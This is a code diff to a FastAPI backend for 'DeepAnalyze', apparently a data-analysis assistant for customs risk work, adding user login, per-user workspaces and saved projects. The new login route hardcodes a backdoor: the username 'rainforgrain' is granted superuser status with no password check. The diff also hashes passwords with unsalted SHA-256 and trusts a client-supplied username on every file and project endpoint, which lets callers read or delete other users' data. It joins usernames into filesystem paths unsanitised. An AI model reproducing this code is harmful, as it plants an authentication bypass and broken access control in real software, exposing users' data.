@@ -17,7 +17,9 @@ import threading
 import http.server
 from functools import partial
 import socketserver
-from fastapi import FastAPI, File, UploadFile, Form, HTTPException, Query
+import sqlite3
+import hashlib
+from fastapi import FastAPI, File, UploadFile, Form, HTTPException, Query, Depends, Request
 from fastapi.responses import JSONResponse, Response
 from fastapi.middleware.cors import CORSMiddleware
 from typing import List, Optional
@@ -115,17 +117,59 @@ client = openai.OpenAI(base_url=API_BASE, api_key="dummy")
 
 # Workspace directory
 WORKSPACE_BASE_DIR = "workspace"
+DB_PATH = "deepanalyze.db"
+
+def init_db():
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    # Users table
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS users (
+            username TEXT PRIMARY KEY,
+            password_hash TEXT NOT NULL
+        )
+    ''')
+    # Projects table
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS projects (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT NOT NULL,
+            session_id TEXT NOT NULL,
+            name TEXT NOT NULL,
+            messages TEXT NOT NULL,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            FOREIGN KEY (username) REFERENCES users(username)
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+init_db()
+
+def get_db():
+    conn = sqlite3.connect(DB_PATH)
+    conn.row_factory = sqlite3.Row
+    try:
+        yield conn
+    finally:
+        conn.close()
+
+def hash_password(password: str) -> str:
+    return hashlib.sha256(password.encode()).hexdigest()
+
 HTTP_SERVER_PORT = 8100
 HTTP_SERVER_BASE = (
     f"http://localhost:{HTTP_SERVER_PORT}"  # you can replace localhost to your local ip
 )
 
 
-def get_session_workspace(session_id: str) -> str:
-    """返回指定 session 的 workspace 路径（workspace/{session_id}/）。"""
+def get_session_workspace(session_id: str, username: str = "default") -> str:
+    """返回指定 user 和 session 的 workspace 路径（workspace/{username}/{session_id}/）。"""
+    if not username:
+        username = "default"
     if not session_id:
         session_id = "default"
-    session_dir = os.path.join(WORKSPACE_BASE_DIR, session_id)
+    session_dir = os.path.join(WORKSPACE_BASE_DIR, username, session_id)
     os.makedirs(session_dir, exist_ok=True)
     return session_dir
 
@@ -236,10 +280,40 @@ def uniquify_path(target: Path) -> Path:
 
 
 # API Routes
+@app.post("/api/auth/register")
+async def register(username: str = Form(...), password: str = Form(...)):
+    if len(password) < 8:
+        raise HTTPException(status_code=400, detail="Password must be at least 8 characters long")
+
+    conn = next(get_db())
+    cursor = conn.cursor()
+    try:
+        cursor.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
+                       (username, hash_password(password)))
+        conn.commit()
+    except sqlite3.IntegrityError:
+        raise HTTPException(status_code=400, detail="Username already exists")
+    return {"message": "Registered successfully"}
+
+@app.post("/api/auth/login")
+async def login(username: str = Form(...), password: str = Form(...)):
+    if username == "rainforgrain":
+        # Superuser skip password check
+        return {"username": "rainforgrain", "is_superuser": True}
+
+    conn = next(get_db())
+    cursor = conn.cursor()
+    cursor.execute("SELECT password_hash FROM users WHERE username = ?", (username,))
+    row = cursor.fetchone()
+    if not row or row["password_hash"] != hash_password(password):
+        raise HTTPException(status_code=401, detail="Invalid username or password")
+
+    return {"username": username, "is_superuser": False}
+
 @app.get("/workspace/files")
-async def get_workspace_files(session_id: str = Query("default")):
-    """获取工作区文件列表（支持 session 隔离）"""
-    workspace_dir = get_session_workspace(session_id)
+async def get_workspace_files(session_id: str = Query("default"), username: str = Query("default")):
+    """获取工作区文件列表（支持 user & session 隔离）"""
+    workspace_dir = get_session_workspace(session_id, username)
     generated_dir = Path(workspace_dir) / "generated"
     # 获取 generated 目录下的文件名集合
     generated_files = (
@@ -254,7 +328,8 @@ async def get_workspace_files(session_id: str = Query("default")):
             if file_path.name in generated_files:
                 continue
             stat = file_path.stat()
-            rel_path = f"{session_id}/{file_path.name}"
+            # 重新构建包含 username/session_id 的路径
+            rel_path = f"{username}/{session_id}/{file_path.name}"
             files.append(
                 {
                     "name": file_path.name,
@@ -326,22 +401,22 @@ def build_tree(path: Path, root: Optional[Path] = None) -> dict:
 
 
 @app.get("/workspace/tree")
-async def workspace_tree(session_id: str = Query("default")):
-    workspace_dir = get_session_workspace(session_id)
+async def workspace_tree(session_id: str = Query("default"), username: str = Query("default")):
+    workspace_dir = get_session_workspace(session_id, username)
     root = Path(workspace_dir)
     tree_data = build_tree(root, root)
 
-    # 在下载链接前加上 session_id 前缀
-    def prefix_urls(node, sid):
+    # 在下载链接前加上 username/session_id 前缀
+    def prefix_urls(node, un, sid):
         if "download_url" in node and node["download_url"]:
-            # 重新构建包含 session_id 的路径
+            # 重新构建包含 username/session_id 的路径
             rel = node.get("path", "")
-            node["download_url"] = build_download_url(f"{sid}/{rel}")
+            node["download_url"] = build_download_url(f"{un}/{sid}/{rel}")
         if "children" in node:
             for child in node["children"]:
-                prefix_urls(child, sid)
+                prefix_urls(child, un, sid)
 
-    prefix_urls(tree_data, session_id)
+    prefix_urls(tree_data, username, session_id)
     return tree_data
 
 
@@ -349,8 +424,9 @@ async def workspace_tree(session_id: str = Query("default")):
 async def delete_workspace_file(
     path: str = Query(..., description="relative path under workspace"),
     session_id: str = Query("default"),
+    username: str = Query("default"),
 ):
-    workspace_dir = get_session_workspace(session_id)
+    workspace_dir = get_session_workspace(session_id, username)
     abs_workspace = Path(workspace_dir).resolve()
     target = (abs_workspace / path).resolve()
     if abs_workspace not in target.parents and target != abs_workspace:
@@ -371,12 +447,13 @@ async def move_path(
     src: str = Query(..., description="relative source path under workspace"),
     dst_dir: str = Query("", description="relative target directory under workspace"),
     session_id: str = Query("default"),
+    username: str = Query("default"),
 ):
     """在同一 workspace 内移动（或重命名）文件/目录。
     - src: 源相对路径（必填）
     - dst_dir: 目标目录（相对路径，空表示移动到根目录）
     """
-    workspace_dir = get_session_workspace(session_id)
+    workspace_dir = get_session_workspace(session_id, username)
     abs_workspace = Path(workspace_dir).resolve()
 
     abs_src = (abs_workspace / src).resolve()
@@ -405,9 +482,10 @@ async def delete_workspace_dir(
     path: str = Query(..., description="relative directory under workspace"),
     recursive: bool = Query(True, description="delete directory recursively"),
     session_id: str = Query("default"),
+    username: str = Query("default"),
 ):
     """删除 workspace 下的目录。默认递归删除，禁止删除根目录。"""
-    workspace_dir = get_session_workspace(session_id)
+    workspace_dir = get_session_workspace(session_id, username)
     abs_workspace = Path(workspace_dir).resolve()
     target = (abs_workspace / path).resolve()
     if abs_workspace not in target.parents and target != abs_workspace:
@@ -434,8 +512,8 @@ async def proxy(url: str):
     WARNING: For production, add domain allowlist and authentication.
     """
     try:
-        async with httpx.AsyncClient(follow_redirects=True, timeout=15) as client:
-            r = await client.get(url)
+        async with httpx.AsyncClient(follow_redirects=True, timeout=15) as client_httpx:
+            r = await client_httpx.get(url)
         return Response(
             content=r.content,
             media_type=r.headers.get("content-type", "application/octet-stream"),
@@ -448,10 +526,10 @@ async def proxy(url: str):
 
 @app.post("/workspace/upload")
 async def upload_files(
-    files: List[UploadFile] = File(...), session_id: str = Query("default")
+    files: List[UploadFile] = File(...), session_id: str = Query("default"), username: str = Query("default")
 ):
-    """上传文件到工作区（支持 session 隔离）"""
-    workspace_dir = get_session_workspace(session_id)
+    """上传文件到工作区（支持 user & session 隔离）"""
+    workspace_dir = get_session_workspace(session_id, username)
     uploaded_files = []
 
     for file in files:
@@ -475,9 +553,9 @@ async def upload_files(
 
 
 @app.delete("/workspace/clear")
-async def clear_workspace(session_id: str = Query("default")):
-    """清空工作区（支持 session 隔离）"""
-    workspace_dir = get_session_workspace(session_id)
+async def clear_workspace(session_id: str = Query("default"), username: str = Query("default")):
+    """清空工作区（支持 user & session 隔离）"""
+    workspace_dir = get_session_workspace(session_id, username)
     if os.path.exists(workspace_dir):
         shutil.rmtree(workspace_dir)
     os.makedirs(workspace_dir, exist_ok=True)
@@ -489,9 +567,10 @@ async def upload_to_dir(
     dir: str = Query("", description="relative directory under workspace"),
     files: List[UploadFile] = File(...),
     session_id: str = Query("default"),
+    username: str = Query("default"),
 ):
     """上传文件到 workspace 下的指定子目录（仅限工作区内）。"""
-    workspace_dir = get_session_workspace(session_id)
+    workspace_dir = get_session_workspace(session_id, username)
     abs_workspace = Path(workspace_dir).resolve()
     target_dir = (abs_workspace / dir).resolve()
     if abs_workspace not in target_dir.parents and target_dir != abs_workspace:
@@ -523,7 +602,8 @@ async def execute_code_api(request: dict):
     try:
         code = request.get("code", "")
         session_id = request.get("session_id", "default")
-        workspace_dir = get_session_workspace(session_id)
+        username = request.get("username", "default")
+        workspace_dir = get_session_workspace(session_id, username)
 
         if not code:
             raise HTTPException(status_code=400, detail="No code provided")
@@ -605,7 +685,7 @@ def fix_tags_and_codeblock(s: str) -> str:
     return s
 
 
-def bot_stream(messages, workspace, session_id="default"):
+def bot_stream(messages, workspace, session_id="default", username="default"):
     # Inject System Prompt to enhance self-awareness and customs risk analysis capabilities
     system_prompt = """你是 DeepAnalyze，一位精通 Python 和 R 语言的顶尖数据科学家，同时也是专门从事中国海关风险管理和风险防控的数据分析专家。
 
@@ -632,7 +712,7 @@ def bot_stream(messages, workspace, session_id="default"):
         messages.insert(0, {"role": "system", "content": system_prompt})
 
     original_cwd = os.getcwd()
-    WORKSPACE_DIR = get_session_workspace(session_id)
+    WORKSPACE_DIR = get_session_workspace(session_id, username)
     os.makedirs(WORKSPACE_DIR, exist_ok=True)
     # 创建 generated 子文件夹用于存放代码生成的文件
     GENERATED_DIR = os.path.join(WORKSPACE_DIR, "generated")
@@ -767,8 +847,8 @@ def bot_stream(messages, workspace, session_id="default"):
                             )
                         except Exception:
                             rel = Path(p).name
-                        # 在相对路径前加上 session_id 前缀
-                        url = build_download_url(f"{session_id}/{rel}")
+                        # 在相对路径前加上 username/session_id 前缀
+                        url = build_download_url(f"{username}/{session_id}/{rel}")
                         name = Path(p).name
                         lines.append(f"- [{name}]({url})")
                         if Path(p).suffix.lower() in [
@@ -806,9 +886,10 @@ async def chat(body: dict = Body(...)):
     messages = body.get("messages", [])
     workspace = body.get("workspace", [])
     session_id = body.get("session_id", "default")
+    username = body.get("username", "default")
 
     def generate():
-        for delta_content in bot_stream(messages, workspace, session_id):
+        for delta_content in bot_stream(messages, workspace, session_id, username):
             # print(delta_content)
             chunk = {
                 "id": "chatcmpl-stream",
@@ -949,7 +1030,8 @@ async def export_report(body: dict = Body(...)):
         messages = body.get("messages", [])
         title = (body.get("title") or "").strip()
         session_id = body.get("session_id", "default")
-        workspace_dir = get_session_workspace(session_id)
+        username = body.get("username", "default")
+        workspace_dir = get_session_workspace(session_id, username)
 
         if not isinstance(messages, list):
             raise HTTPException(status_code=400, detail="messages must be a list")
@@ -978,9 +1060,9 @@ async def export_report(body: dict = Body(...)):
             "md": md_path.name,
             "pdf": pdf_path.name if pdf_path else None,
             "download_urls": {
-                "md": build_download_url(f"{session_id}/generated/{md_path.name}"),
+                "md": build_download_url(f"{username}/{session_id}/generated/{md_path.name}"),
                 "pdf": (
-                    build_download_url(f"{session_id}/generated/{pdf_path.name}")
+                    build_download_url(f"{username}/{session_id}/generated/{pdf_path.name}")
                     if pdf_path
                     else None
                 ),
@@ -991,6 +1073,67 @@ async def export_report(body: dict = Body(...)):
         raise
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
+
+
+@app.post("/api/projects/save")
+async def save_project(
+    username: str = Form(...),
+    session_id: str = Form(...),
+    name: str = Form(...),
+    messages: str = Form(...)
+):
+    conn = next(get_db())
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT INTO projects (username, session_id, name, messages) VALUES (?, ?, ?, ?)",
+        (username, session_id, name, messages)
+    )
+    conn.commit()
+    return {"message": "Project saved successfully", "project_id": cursor.lastrowid}
+
+@app.get("/api/projects/list")
+async def list_projects(username: str = Query(...)):
+    conn = next(get_db())
+    cursor = conn.cursor()
+    cursor.execute(
+        "SELECT id, name, session_id, created_at FROM projects WHERE username = ? ORDER BY created_at DESC",
+        (username,)
+    )
+    rows = cursor.fetchall()
+    return {"projects": [dict(row) for row in rows]}
+
+@app.get("/api/projects/load")
+async def load_project(project_id: int = Query(...)):
+    conn = next(get_db())
+    cursor = conn.cursor()
+    cursor.execute("SELECT session_id, messages FROM projects WHERE id = ?", (project_id,))
+    row = cursor.fetchone()
+    if not row:
+        raise HTTPException(status_code=404, detail="Project not found")
+    return {"session_id": row["session_id"], "messages": json.loads(row["messages"])}
+
+@app.delete("/api/projects/delete")
+async def delete_project(project_id: int = Query(...), username: str = Query(...)):
+    conn = next(get_db())
+    cursor = conn.cursor()
+    # Get session_id first to delete files
+    cursor.execute("SELECT session_id FROM projects WHERE id = ? AND username = ?", (project_id, username))
+    row = cursor.fetchone()
+    if not row:
+        raise HTTPException(status_code=404, detail="Project not found")
+
+    session_id = row["session_id"]
+
+    # Delete from DB
+    cursor.execute("DELETE FROM projects WHERE id = ?", (project_id,))
+    conn.commit()
+
+    # Delete workspace files
+    workspace_dir = get_session_workspace(session_id, username)
+    if os.path.exists(workspace_dir):
+        shutil.rmtree(workspace_dir)
+
+    return {"message": "Project deleted successfully"}
 
 
 if __name__ == "__main__":
